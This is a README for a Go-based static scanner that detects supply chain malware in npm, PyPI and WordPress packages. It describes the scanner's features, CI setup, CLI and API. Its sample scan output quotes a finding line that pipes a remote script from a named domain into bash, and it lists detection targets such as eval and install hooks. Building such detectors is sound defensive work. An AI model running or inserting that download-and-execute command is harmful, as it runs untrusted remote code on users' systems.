# go-yara-supplychain

[![CI](https://github.com/cawalch/go-yara-supplychain/actions/workflows/ci.yml/badge.svg)](https://github.com/cawalch/go-yara-supplychain/actions/workflows/ci.yml)
[![Go Reference](https://pkg.go.dev/badge/github.com/cawalch/go-yara-supplychain.svg)](https://pkg.go.dev/github.com/cawalch/go-yara-supplychain)
[![Release](https://img.shields.io/github/v/release/cawalch/go-yara-supplychain?include_prereleases)](https://github.com/cawalch/go-yara-supplychain/releases)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)

Pure-Go static analysis engine for detecting supply chain malware across npm, PyPI, and PHP/WordPress packages. Built on [`cawalch/go-yara`](https://github.com/cawalch/go-yara) with zero CGO dependencies.

Traditional signature scanners fail in package registries: they flag legitimate build tooling (`esbuild`, `node-gyp`, `sharp`) while missing obfuscated droppers and interpreter auto-execution vectors. `go-yara-supplychain` pairs AST normalization and domain disambiguation with a calibrated ensemble model to block malicious dependencies without false alarms on production bundles.

---

## Capabilities & Design Invariants

* **Multi-Ecosystem Coverage**:
  * **npm**: Manifest inspection (`package.json`), lifecycle script analysis (`preinstall`, `postinstall`), and source validation.
  * **Python / PyPI**: Declarative metadata (`pyproject.toml`, `setup.cfg`), imperative build hooks (`setup.py` custom `cmdclass`), and interpreter startup vectors (`.pth` auto-execution files).
  * **PHP / Composer / WordPress**: `composer.json` lifecycle hooks, WordPress plugin/theme header blocks, and `.htaccess` execution handler overrides.
* **Invariant-Based Detection (Anti-Evasion)**:
  * **De-obfuscation Pipeline**: Strips zero-width/BiDi Unicode traps (`U+200B`, `U+FEFF`), folds concatenated string constants, and extracts nested Base64/Hex payloads.
  * **Bitwise XOR Detection**: Flags XOR decryption loops paired with dynamic code evaluation (`eval`, `assert`, `create_function`, `proc_open`).
  * **Passive Library Invariant**: Flags packages that execute arbitrary code outside standard execution flows (e.g. at install time or interpreter initialization).
* **Calibrated Ensemble Model**: Combines rule matches with an $L_2$-regularized logistic model trained via 5-fold cross-validation on real-world packages. Yields 0.00% false positive rates on complex production bundles (React, Lodash, Webpack).
* **Zero Network at Scan Time**: All rules and model weights are compiled into the binary via `//go:embed`. Runs in air-gapped environments without external telemetry or API dependencies.
* **Zero CGO**: Statically links to a single binary. No dynamic libraries, GCC/Clang toolchains, or container runtime dependencies.

---

## Architecture

```text
                  Package Directory / Workspace Target
                                    │
                                    ▼
                     Multi-Ecosystem Discovery
           ┌────────────────────────┼────────────────────────┐
           ▼                        ▼                        ▼
       npm Parser              PyPI Parser              PHP Parser
     (package.json)       (setup.py, .pth, toml)   (composer.json, wp-header)
           │                        │                        │
           └────────────────────────┼────────────────────────┘
                                    │
                                    ▼
                        AST De-obfuscation Engine
               - Strips zero-width and BiDi Unicode
               - Folds string constants and hex escapes
               - Unpacks Base64 payloads (skips SVG data URIs)
               - Detects bitwise XOR decryption loops
                                    │
                                    ▼
                        Domain Disambiguation
               - Whitelists checksum-verified binary fetchers
               - Validates trusted package registries and mirrors
                                    │
                                    ▼
                        Pure-Go YARA Matcher
               (Embedded supply chain rules & signatures)
                                    │
                                    ▼
                         Calibrated Ensemble
                   ┌────────────────┴────────────────┐
                   ▼                                 ▼
             Rule Matches                     16-D Feature Vector
           (Severity Weights)                 (Logistic Regression)
                   │                                 │
                   └────────────────┬────────────────┘
                                    │
                                    ▼
                            Final Verdict
               - Action: PASS | WARN | BLOCK
               - Output: Terminal | JSON | NDJSON | SARIF 2.1.0
```

---

## Installation

### Binary Releases

Download precompiled, Cosign-signed binaries from [GitHub Releases](https://github.com/cawalch/go-yara-supplychain/releases):

* Linux (`amd64`, `arm64`)
* macOS (`amd64`, `arm64` Apple Silicon)
* Windows (`amd64`, `arm64`)

### Go Toolchain

```bash
go install github.com/cawalch/go-yara-supplychain/cmd/go-yara-supplychain@latest
```

---

## CI/CD Integration

### GitHub Actions

Add the scanner as an automated PR and deployment gate:

```yaml
name: Supply Chain Audit
on: [push, pull_request]

permissions:
  contents: read
  security-events: write

jobs:
  scan:
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout Code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Run Supply Chain Scanner
        uses: cawalch/go-yara-supplychain@v0.2.0
        with:
          path: '.'
          sarif-file: 'supplychain.sarif'
          fail-on-critical: 'true'

      - name: Upload SARIF to GitHub Security Tab
        uses: github/codeql-action/upload-sarif@6f2ac81f5cd81fe351a197ba0b00d91d03cd2aee # v4.39.0
        if: always()
        with:
          sarif_file: 'supplychain.sarif'
```

### Vela CI/CD

`go-yara-supplychain` runs natively as a Vela container plugin:

```yaml
version: "1"

steps:
  - name: supply-chain-scan
    image: ghcr.io/cawalch/go-yara-supplychain:v0.2.0
    pull: always
    parameters:
      path: "."
      sarif: "supplychain-results.sarif"
      fail_on_critical: true
      fail_on_warn: false
      no_color: true
```

*Vela parameters defined under `parameters:` are automatically mapped to `PARAMETER_*` environment variables by the container entrypoint.*

---

## CLI Reference

```text
Usage: go-yara-supplychain [flags] [path...]

Flags:
  --sarif string
        File path to write SARIF 2.1.0 report
  --json
        Output results in formatted JSON
  --ndjson
        Output results in newline-delimited JSON
  --fail-on-critical
        Exit with code 1 if CRITICAL threats are found (default true)
  --fail-on-warn
        Exit with code 1 if HIGH or MEDIUM threats are found (default false)
  --no-color
        Disable ANSI colored terminal output
  --version
        Print engine version and exit
```

### Exit Codes

| Exit Code | Condition |
| :---: | :--- |
| `0` | Scan passed with no blocking violations. |
| `1` | Threats detected matching `--fail-on-critical` (default) or `--fail-on-warn`. |
| `2` | Configuration or initialization error (e.g. invalid target path). |

### Output Example

```text
=== go-yara-supplychain Security Scan Results ===

[CRITICAL - BLOCK] @Rank Math SEO PRO (score: 1.00)
  Path: ./plugins/seo-by-rank-math-pro
  Findings (3):
    - [CRITICAL] Remote script download piped directly to shell (rank-math-pro.php)
      Code: curl https://rank1cdn.com/sh | bash
    - [HIGH] Dynamic evaluation of decoded byte/base64 payload (rank-math-pro.php)
      Code: base64
    - [CRITICAL] WordPress supply chain backdoor with C2, rogue admin, or core file masquerading (rank-math-pro.php)
      Code: xmmqhn
  Neural Anomaly Risk: 99.3%
  Top Contributing Signals (Explainable AI):
    - HookPipesToShell: impact +1.77
    - DynamicEval: impact -0.22
    - YARAMatchWeight: impact +8.54

[BENIGN - PASS] @esbuild (score: 0.00)
  Path: ./node_modules/esbuild

Summary: 2 packages scanned | 1 passed | 1 critical | 0 high | 0 medium
```

---

## Go API Reference

Embed the engine directly into ingestion workers, registries, or verification pipelines:

```go
package main

import (
	"fmt"
	"log"

	"github.com/cawalch/go-yara-supplychain/pkg/analyzer"
	"github.com/cawalch/go-yara-supplychain/pkg/ecosystems/npm"
	"github.com/cawalch/go-yara-supplychain/pkg/ecosystems/php"
	"github.com/cawalch/go-yara-supplychain/pkg/ecosystems/pypi"
)

func main() {
	engine, err := analyzer.NewEngine()
	if err != nil {
		log.Fatalf("initializing engine: %v", err)
	}

	// 1. Inspect an npm package
	npmPkg, _ := npm.ParsePackageDir("./node_modules/express")
	v1, _ := engine.AnalyzePackage(npmPkg)
	fmt.Printf("npm: %s -> %s (score: %.2f)\n", v1.PackageName, v1.Action, v1.ConfidenceScore)

	// 2. Inspect a Python package
	pyPkg, _ := pypi.ParsePackageDir("./vendor/requests")
	v2, _ := engine.AnalyzePyPIPackage(pyPkg)
	fmt.Printf("PyPI: %s -> %s (score: %.2f)\n", v2.PackageName, v2.Action, v2.ConfidenceScore)

	// 3. Inspect a PHP / WordPress package
	phpPkg, _ := php.ParsePackageDir("./wp-content/plugins/sample")
	v3, _ := engine.AnalyzePHPPackage(phpPkg)
	fmt.Printf("PHP: %s -> %s (score: %.2f)\n", v3.PackageName, v3.Action, v3.ConfidenceScore)
}
```

---

## Cryptographic Verification

All release artifacts are cryptographically signed using Sigstore Cosign keyless signing. Verify release integrity and provenance:

```bash
cosign verify-blob \
  --bundle cosign.bundle \
  --certificate-identity-regexp "https://github.com/cawalch/go-yara-supplychain/" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  checksums.txt
```

---

## License

[Apache License 2.0](LICENSE)
